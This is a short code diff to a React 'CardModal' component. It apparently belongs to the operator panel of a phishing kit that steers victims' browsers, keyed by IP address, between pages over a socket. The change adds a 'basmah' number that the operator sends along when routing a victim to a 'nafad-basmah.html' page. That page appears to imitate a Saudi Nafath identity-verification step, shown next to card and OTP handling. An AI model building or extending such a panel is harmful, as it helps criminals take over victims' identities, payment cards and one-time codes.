@@ -33,6 +33,7 @@ const LABEL = {
 
 export default function CardModal({ ip, user, onClose }) {
   const [confirm, setConfirm] = useState({ show: false, page: null });
+  const [basmah, setBasmah] = useState("");
 
   // blink states
   const [blinkOtp, setBlinkOtp] = useState(false);
@@ -79,9 +80,12 @@ export default function CardModal({ ip, user, onClose }) {
   } = user;
 
   const handlePageClick = (page) => setConfirm({ show: true, page });
-  const hideConfirm = () => setConfirm({ show: false, page: null });
+  const hideConfirm = () => { setConfirm({ show: false, page: null }); setBasmah(""); };
 
   const handleConfirm = () => {
+    if (confirm.page === "nafad-basmah.html" && basmah) {
+      socket.emit("updateBasmah", { ip, basmah: Number(basmah) });
+    }
     socket.emit("navigateTo", { ip, page: confirm.page });
     hideConfirm();
   };
@@ -198,6 +202,8 @@ export default function CardModal({ ip, user, onClose }) {
       <ConfirmDialog
         show={confirm.show}
         page={confirm.page}
+        basmah={basmah}
+        onBasmahChange={setBasmah}
         onConfirm={handleConfirm}
         onDecline={handleDecline}
         onClose={hideConfirm}
